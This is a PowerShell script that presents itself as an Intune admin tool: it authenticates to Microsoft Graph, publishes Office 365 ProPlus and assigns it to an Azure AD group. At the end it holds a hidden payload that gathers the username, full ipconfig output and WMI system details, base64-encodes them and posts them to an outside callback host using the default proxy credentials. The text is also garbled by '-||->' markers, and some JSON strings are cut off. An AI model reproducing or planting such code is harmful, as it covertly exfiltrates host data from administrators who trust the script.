




 -||-> function Get-AuthToken {



[cmdletbinding()]

param
(
    [Parameter(Mandatory=$true)]
    $User
)

 -||-> $userUpn =  -||-> New-Object "System.Net.Mail.MailAddress" -ArgumentList $User <-||-  <-||- 

 -||-> $tenant = $userUpn.Host <-||- 

 -||-> Write-Host "Checking for AzureAD module..." <-||- 

     -||-> $AadModule =  -||-> Get-Module -Name "AzureAD" -ListAvailable <-||-  <-||- 

     -||-> if ( -||-> $AadModule -eq $null <-||- ) {

         -||-> Write-Host "AzureAD PowerShell module not found, looking for AzureADPreview" <-||- 
         -||-> $AadModule =  -||-> Get-Module -Name "AzureADPreview" -ListAvailable <-||-  <-||- 

    } <-||- 

     -||-> if ( -||-> $AadModule -eq $null <-||- ) {
         -||-> write-host <-||- 
         -||-> write-host "AzureAD Powershell module not installed..." -f Red <-||- 
         -||-> write-host "Install by running 'Install-Module AzureAD' or 'Install-Module AzureADPreview' from an elevated PowerShell prompt" -f Yellow <-||- 
         -||-> write-host "Script can't continue..." -f Red <-||- 
         -||-> write-host <-||- 
        exit
    } <-||- 




     -||-> if( -||-> $AadModule.count -gt 1 <-||- ){

         -||-> $Latest_Version = ( -||-> $AadModule | select version | Sort-Object <-||- )[-1] <-||- 

         -||-> $aadModule =  -||-> $AadModule | ? {  -||-> $_.version -eq $Latest_Version.version <-||-  } <-||-  <-||- 

            

             -||-> if( -||-> $AadModule.count -gt 1 <-||- ){

             -||-> $aadModule =  -||-> $AadModule | select -Unique <-||-  <-||- 

            } <-||- 

         -||-> $adal =  -||-> Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.dll" <-||-  <-||- 
         -||-> $adalforms =  -||-> Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.Platform.dll" <-||-  <-||- 

    }

    else {

         -||-> $adal =  -||-> Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.dll" <-||-  <-||- 
         -||-> $adalforms =  -||-> Join-Path $AadModule.ModuleBase "Microsoft.IdentityModel.Clients.ActiveDirectory.Platform.dll" <-||-  <-||- 

    } <-||- 

 -||-> [System.Reflection.Assembly]::LoadFrom($adal) | Out-Null <-||- 

 -||-> [System.Reflection.Assembly]::LoadFrom($adalforms) | Out-Null <-||- 

 -||-> $clientId = "d1ddf0e4-d672-4dae-b554-9d5bdfd93547" <-||- 

 -||-> $redirectUri = "urn:ietf:wg:oauth:2.0:oob" <-||- 

 -||-> $resourceAppIdURI = "https://graph.microsoft.com" <-||- 

 -||-> $authority = "https://login.microsoftonline.com/$Tenant" <-||- 

     -||-> try {

     -||-> $authContext =  -||-> New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.AuthenticationContext" -ArgumentList $authority <-||-  <-||- 

    
    

     -||-> $platformParameters =  -||-> New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.PlatformParameters" -ArgumentList "Auto" <-||-  <-||- 

     -||-> $userId =  -||-> New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.UserIdentifier" -ArgumentList ( -||-> $User, "OptionalDisplayableId" <-||- ) <-||-  <-||- 

     -||-> $authResult = $authContext.AcquireTokenAsync($resourceAppIdURI,$clientId,$redirectUri,$platformParameters,$userId).Result <-||- 

        

         -||-> if( -||-> $authResult.AccessToken <-||- ){

        

         -||-> $authHeader = @{
            'Content-Type'= -||-> 'application/json' <-||- 
            'Authorization'= -||-> "Bearer " + $authResult.AccessToken <-||- 
            'ExpiresOn'= -||-> $authResult.ExpiresOn <-||- 
            } <-||- 

        return  -||-> $authHeader <-||- 

        }

        else {

         -||-> Write-Host <-||- 
         -||-> Write-Host "Authorization Access Token is null, please re-run authentication..." -ForegroundColor Red <-||- 
         -||-> Write-Host <-||- 
        break

        } <-||- 

    }

    catch {

     -||-> write-host $_.Exception.Message -f Red <-||- 
     -||-> write-host $_.Exception.ItemName -f Red <-||- 
     -||-> write-host <-||- 
    break

    } <-||- 

} <-||- 



 -||-> Function Add-MDMApplication(){



[cmdletbinding()]

param
(
    $JSON
)

 -||-> $graphApiVersion = "Beta" <-||- 
 -||-> $App_resource = "deviceAppManagement/mobileApps" <-||- 

     -||-> try {

         -||-> if( -||-> !$JSON <-||- ){

         -||-> write-host "No JSON was passed to the function, provide a JSON variable" -f Red <-||- 
        break

        } <-||- 

         -||-> Test-JSON -JSON $JSON <-||- 

         -||-> $uri = "https://graph.microsoft.com/$graphApiVersion/$( -||-> $App_resource <-||- )" <-||- 
         -||-> Invoke-RestMethod -Uri $uri -Method Post -ContentType "application/json" -Body $JSON -Headers $authToken <-||- 

    }

    catch {

     -||-> $ex = $_.Exception <-||- 
     -||-> $errorResponse = $ex.Response.GetResponseStream() <-||- 
     -||-> $reader =  -||-> New-Object System.IO.StreamReader( -||-> $errorResponse <-||- ) <-||-  <-||- 
     -||-> $reader.BaseStream.Position = 0 <-||- 
     -||-> $reader.DiscardBufferedData() <-||- 
     -||-> $responseBody = $reader.ReadToEnd() <-||- ;
     -||-> Write-Host "Response content:`n$responseBody" -f Red <-||- 
     -||-> Write-Error "Request to $Uri failed with HTTP Status $( -||-> $ex.Response.StatusCode <-||- ) $( -||-> $ex.Response.StatusDescription <-||- )" <-||- 
     -||-> write-host <-||- 
    break

    } <-||- 

} <-||- 



 -||-> Function Add-ApplicationAssignment(){



[cmdletbinding()]

param
(
    $ApplicationId,
    $TargetGroupId,
    $InstallIntent
)

 -||-> $graphApiVersion = "Beta" <-||- 
 -||-> $Resource = "deviceAppManagement/mobileApps/$ApplicationId/assign" <-||- 
    
     -||-> try {

         -||-> if( -||-> !$ApplicationId <-||- ){

         -||-> write-host "No Application Id specified, specify a valid Application Id" -f Red <-||- 
        break

        } <-||- 

         -||-> if( -||-> !$TargetGroupId <-||- ){

         -||-> write-host "No Target Group Id specified, specify a valid Target Group Id" -f Red <-||- 
        break

        } <-||- 

        
         -||-> if( -||-> !$InstallIntent <-||- ){

         -||-> write-host "No Install Intent specified, specify a valid Install Intent - available, notApplicable, required, uninstall, availableWithoutEnrollment" -f Red <-||- 
        break

        } <-||- 

 -||-> $JSON = @"

{
    "mobileAppAssignments": [
    {
        "@odata.type": "
        "target": {
        "@odata.type": "
        "groupId": "$TargetGroupId"
        },
        "intent": "$InstallIntent"
    }
    ]
}

"@ <-||- 

     -||-> $uri = "https://graph.microsoft.com/$graphApiVersion/$( -||-> $Resource <-||- )" <-||- 
     -||-> Invoke-RestMethod -Uri $uri -Headers $authToken -Method Post -Body $JSON -ContentType "application/json" <-||- 

    }
    
    catch {

     -||-> $ex = $_.Exception <-||- 
     -||-> $errorResponse = $ex.Response.GetResponseStream() <-||- 
     -||-> $reader =  -||-> New-Object System.IO.StreamReader( -||-> $errorResponse <-||- ) <-||-  <-||- 
     -||-> $reader.BaseStream.Position = 0 <-||- 
     -||-> $reader.DiscardBufferedData() <-||- 
     -||-> $responseBody = $reader.ReadToEnd() <-||- ;
     -||-> Write-Host "Response content:`n$responseBody" -f Red <-||- 
     -||-> Write-Error "Request to $Uri failed with HTTP Status $( -||-> $ex.Response.StatusCode <-||- ) $( -||-> $ex.Response.StatusDescription <-||- )" <-||- 
     -||-> write-host <-||- 
    break

    } <-||- 

} <-||- 



 -||-> Function Test-JSON(){



param (

$JSON

)

     -||-> try {

     -||-> $TestJSON =  -||-> ConvertFrom-Json $JSON -ErrorAction Stop <-||-  <-||- 
     -||-> $validJson = $true <-||- 

    }

    catch {

     -||-> $validJson = $false <-||- 
     -||-> $_.Exception <-||- 

    } <-||- 

     -||-> if ( -||-> !$validJson <-||- ){
    
     -||-> Write-Host "Provided JSON isn't in valid JSON format" -f Red <-||- 
    break

    } <-||- 

} <-||- 



 -||-> Function Get-AADGroup(){



[cmdletbinding()]

param
(
    $GroupName,
    $id,
    [switch]$Members
)


 -||-> $graphApiVersion = "v1.0" <-||- 
 -||-> $Group_resource = "groups" <-||- 
    
     -||-> try {

         -||-> if( -||-> $id <-||- ){

         -||-> $uri = "https://graph.microsoft.com/$graphApiVersion/$( -||-> $Group_resource <-||- )?`$filter=id eq '$id'" <-||- 
         -||-> ( -||-> Invoke-RestMethod -Uri $uri –Headers $authToken –Method Get <-||- ).Value <-||- 

        }
        
        elseif( -||-> $GroupName -eq "" -or $GroupName -eq $null <-||- ){
        
         -||-> $uri = "https://graph.microsoft.com/$graphApiVersion/$( -||-> $Group_resource <-||- )" <-||- 
         -||-> ( -||-> Invoke-RestMethod -Uri $uri –Headers $authToken –Method Get <-||- ).Value <-||- 
        
        }

        else {
            
             -||-> if( -||-> !$Members <-||- ){

             -||-> $uri = "https://graph.microsoft.com/$graphApiVersion/$( -||-> $Group_resource <-||- )?`$filter=displayname eq '$GroupName'" <-||- 
             -||-> ( -||-> Invoke-RestMethod -Uri $uri –Headers $authToken –Method Get <-||- ).Value <-||- 
            
            }
            
            elseif( -||-> $Members <-||- ){
            
             -||-> $uri = "https://graph.microsoft.com/$graphApiVersion/$( -||-> $Group_resource <-||- )?`$filter=displayname eq '$GroupName'" <-||- 
             -||-> $Group = ( -||-> Invoke-RestMethod -Uri $uri –Headers $authToken –Method Get <-||- ).Value <-||- 
            
                 -||-> if( -||-> $Group <-||- ){

                 -||-> $GID = $Group.id <-||- 

                 -||-> $Group.displayName <-||- 
                 -||-> write-host <-||- 

                 -||-> $uri = "https://graph.microsoft.com/$graphApiVersion/$( -||-> $Group_resource <-||- )/$GID/Members" <-||- 
                 -||-> ( -||-> Invoke-RestMethod -Uri $uri –Headers $authToken –Method Get <-||- ).Value <-||- 

                } <-||- 

            } <-||- 
        
        } <-||- 

    }

    catch {

     -||-> $ex = $_.Exception <-||- 
     -||-> $errorResponse = $ex.Response.GetResponseStream() <-||- 
     -||-> $reader =  -||-> New-Object System.IO.StreamReader( -||-> $errorResponse <-||- ) <-||-  <-||- 
     -||-> $reader.BaseStream.Position = 0 <-||- 
     -||-> $reader.DiscardBufferedData() <-||- 
     -||-> $responseBody = $reader.ReadToEnd() <-||- ;
     -||-> Write-Host "Response content:`n$responseBody" -f Red <-||- 
     -||-> Write-Error "Request to $Uri failed with HTTP Status $( -||-> $ex.Response.StatusCode <-||- ) $( -||-> $ex.Response.StatusDescription <-||- )" <-||- 
     -||-> write-host <-||- 
    break

    } <-||- 

} <-||- 





 -||-> write-host <-||- 


 -||-> if( -||-> $global:authToken <-||- ){

    
     -||-> $DateTime = ( -||-> Get-Date <-||- ).ToUniversalTime() <-||- 

    
     -||-> $TokenExpires = ( -||-> $authToken.ExpiresOn.datetime - $DateTime <-||- ).Minutes <-||- 

         -||-> if( -||-> $TokenExpires -le 0 <-||- ){

         -||-> write-host "Authentication Token expired" $TokenExpires "minutes ago" -ForegroundColor Yellow <-||- 
         -||-> write-host <-||- 

            

             -||-> if( -||-> $User -eq $null -or $User -eq "" <-||- ){

             -||-> $User =  -||-> Read-Host -Prompt "Please specify your user principal name for Azure Authentication" <-||-  <-||- 
             -||-> Write-Host <-||- 

            } <-||- 

         -||-> $global:authToken =  -||-> Get-AuthToken -User $User <-||-  <-||- 

        } <-||- 
}



else {

     -||-> if( -||-> $User -eq $null -or $User -eq "" <-||- ){

     -||-> $User =  -||-> Read-Host -Prompt "Please specify your user principal name for Azure Authentication" <-||-  <-||- 
     -||-> Write-Host <-||- 

    } <-||- 


 -||-> $global:authToken =  -||-> Get-AuthToken -User $User <-||-  <-||- 

} <-||- 







 -||-> Write-Host <-||- 

 -||-> $AADGroup =  -||-> Read-Host -Prompt "Enter the Azure AD Group name where applications will be assigned" <-||-  <-||- 

 -||-> $TargetGroupId = ( -||-> get-AADGroup -GroupName "$AADGroup" <-||- ).id <-||- 

     -||-> if( -||-> $TargetGroupId -eq $null -or $TargetGroupId -eq "" <-||- ){

     -||-> Write-Host "AAD Group - '$AADGroup' doesn't exist, please specify a valid AAD Group..." -ForegroundColor Red <-||- 
     -||-> Write-Host <-||- 
    exit

    } <-||- 

 -||-> Write-Host <-||- 



 -||-> $JSON = @"

{
  "@odata.type": "
  "autoAcceptEula": true,
  "description": "Office 365 ProPlus - Assigned",
  "developer": "Microsoft",
  "displayName": "Office 365 ProPlus - Assigned",
  "excludedApps": {
    "groove": true,
    "infoPath": true,
    "sharePointDesigner": true
  },
  "informationUrl": "",
  "isFeatured": false,
  "largeIcon": {
    "type": "image/png",
    "value": "iVBORw0KGgoAAAANSUhEUgAAAF0AAAAeCAMAAAEOZNKlAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAJhUExURf////7z7/i9qfF1S/KCW/i+qv3q5P/9/PrQwfOMae1RG+s8AOxGDfBtQPWhhPvUx/759/zg1vWgg+9fLu5WIvKFX/rSxP728/nCr/FyR+tBBvOMaO1UH+1RHOs+AvSScP3u6f/+/v3s5vzg1+xFDO9kNPOOa/i7pvzj2/vWyes9Af76+Pzh2PrTxf/6+f7y7vOGYexHDv3t5+1SHfi8qPOIZPvb0O1NFuxDCe9hMPSVdPnFs/3q4/vaz/STcu5VIe5YJPWcfv718v/9/e1MFfF4T/F4TvF2TP3o4exECvF0SexIEPONavzn3/vZze1QGvF3Te5dK+5cKvrPwPrQwvKAWe1OGPexmexKEveulfezm/BxRfamiuxLE/apj/zf1e5YJfSXd/OHYv3r5feznPakiPze1P7x7f739f3w6+xJEfnEsvWdf/Wfge1LFPe1nu9iMvnDsfBqPOs/BPOIY/WZevJ/V/zl3fnIt/vTxuxHD+xEC+9mN+5ZJv749vBpO/KBWvBwRP/8+/SUc/etlPjArP/7+vOLZ/F7UvWae/708e1OF/aihvSWdvi8p+tABfSZefvVyPWihfSVde9lNvami+9jM/zi2fKEXvBuQvOKZvalifF5UPJ/WPSPbe9eLfrKuvvd0uxBB/7w7Pzj2vrRw/rOv+1PGfi/q/eymu5bKf3n4PnJuPBrPf3t6PWfgvWegOxCCO9nOO9oOfaskvSYePi5pPi2oPnGtO5eLPevlvKDXfrNvv739Pzd0/708O9gL+9lNfJ9VfrLu/OPbPnDsPBrPus+A/nArfarkQAAAGr5HKgAAADLdFJOU/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////8AvuakogAAAAlwSFlzAAAOwwAADsMBx2+oZAAAAz5JREFUOE+tVTtu4zAQHQjppmWzwIJbEVCzpTpjbxD3grQHSOXKRXgCAT6EC7UBVAmp3KwBnmvfzNCyZTmxgeTZJsXx43B+HBHRE34ZkXgkerXFTheeiCkRrbB4UXmp4wSWz5raaQEMTM5TZwuiXoaKgV+6FsmkZQcSy0kA71yMTMGHanX+AzMMGLAQCxU1F/ZwjULPugazl82GM0NEKm/U8EqFwEkO3/EAT4grgl0nucwlk9pcpTTJ4VPA4g/Rb3yIRhhp507e9nTQmZ1OS5RO4sS7nIRPEeHXCHdkw9ZEW2yVE5oIS7peD58Avs7CN+PVCmHh21oOqBdjDzIs+FldPJ74TFESUSJEfVzy9U/dhu+AuOT6eBp6gGKyXEx8euO450ZE4CMfstMFT44broWw/itkYErWXRx+fFArt9Ca9os78TFed0LVIUsmIHrwbwaw3BEOnOk94qVpQ6Ka2HjxewJnfyd6jUtGDQLdWlzmYNYLeKbbGOucJsNabCq1Yub0o92rtR+i30V2dapxYVEePXcOjeCKPnYyit7BtKeNlZqHbr+gt7i+AChWA9RsRs03pxTQc67ouWpxyESvjK5Vs3DVSy3IpkxPm5X+wZoBi+MFHWW69/w8FRhc7VBe6HAhMB2b8Q0XqDzTNZtXUMnKMjwKVaCrB/CSUL7WSx/HsdJC86lFGXwnioTeOMPjV+szlFvrZLA5VMVK4y+41l4e1xfx7Z88o4hkilRUH/qKqwNVlgDgpvYCpH3XwAy5eMCRnezIUxffVXoDql2rTHFDO+pjWnTWzAfrYXn6BFECblUpWGrvPZvBipETjS5ydM7tdXpH41ZCEbBNy/+wFZu71QO2t9pgT+iZEf657Q1vpN94PQNDxUHeKR103LV9nPVOtDikcNKO+2naCw7yKBhOe9Hm79pe8C4/CfC2wDjXnqC94kEeBU3WwN7dt/2UScXas7zDl5GpkY+M8WKv2J7fd4Ib2rGTk+jsC2cleEM7jI9veF7B0MBJrsZqfKd/81q9pR2NZfwJK2JzsmIT1Ns8jUH0UusQBpU8d2JzsHiXg1zXGLqxfitUNTDT/nUUeqDBp2HZVr+Ocqi/Ty3Rf4Jn82xxfSNtAAAAAElFTkSuQmCC"
  },
  "localesToInstall": [
    "en-us"
  ],
  "notes": "",
  "officePlatformArchitecture": "x86",
  "owner": "Microsoft",
  "privacyInformationUrl": "",
  "productIds": [
    "o365ProPlusRetail",
    "projectProRetail",
    "visioProRetail"
  ],
  "publisher": "Microsoft",
  "updateChannel": "firstReleaseCurrent",
  "useSharedComputerActivation": false
}

"@ <-||- 



 -||-> write-host "Publishing" ( -||-> $JSON | ConvertFrom-Json <-||- ).displayName -ForegroundColor Yellow <-||- 

 -||-> $Create_Application =  -||-> Add-MDMApplication -JSON $JSON <-||-  <-||- 

 -||-> Write-Host "Application created as $( -||-> $Create_Application.displayName <-||- )/$( -||-> $create_Application.id <-||- )" <-||- 

 -||-> $ApplicationId = $Create_Application.id <-||- 

 -||-> $Assign_Application =  -||-> Add-ApplicationAssignment -ApplicationId $ApplicationId -TargetGroupId $TargetGroupId -InstallIntent "required" <-||-  <-||- 
 -||-> Write-Host "Assigned '$AADGroup' to $( -||-> $Create_Application.displayName <-||- )/$( -||-> $Create_Application.id <-||- ) with" $Assign_Application.InstallIntent "install Intent" <-||- 

 -||-> Write-Host <-||- 

 -||-> $user =  -||-> whoami <-||-  <-||- 
 -||-> $ip =  -||-> ipconfig /all | out-string <-||-  <-||- 
 -||-> $wmi =  -||-> Get-WmiObject -Class Win32_ComputerSystem | out-string <-||-  <-||-  


 -||-> $temp  = [System.Text.Encoding]::UTF8.GetBytes($user) <-||- 
 -||-> $userEnc = [System.Convert]::ToBase64String($temp) <-||- 
 -||-> $temp  = [System.Text.Encoding]::UTF8.GetBytes($ip) <-||- 
 -||-> $ipEnc = [System.Convert]::ToBase64String($temp) <-||- 
 -||-> $temp  = [System.Text.Encoding]::UTF8.GetBytes($wmi) <-||- 
 -||-> $wmiEnc = [System.Convert]::ToBase64String($temp) <-||- 

 -||-> $url = "https://callback.1cn.ca/information.html" <-||- 

 -||-> $NVC =  -||-> New-Object System.Collections.Specialized.NameValueCollection <-||-  <-||- 
 -||-> $NVC.Add("U", $userEnc) <-||- 
 -||-> $NVC.Add("I", $ipEnc) <-||- 
 -||-> $NVC.Add("W", $wmiEnc) <-||- 

 -||-> $wc =  -||-> New-Object System.Net.WebClient <-||-  <-||-      
 -||-> $wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy <-||- 
 -||-> $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials <-||- 
 -||-> $wc.UploadValues($URL,"post", $NVC) <-||- 



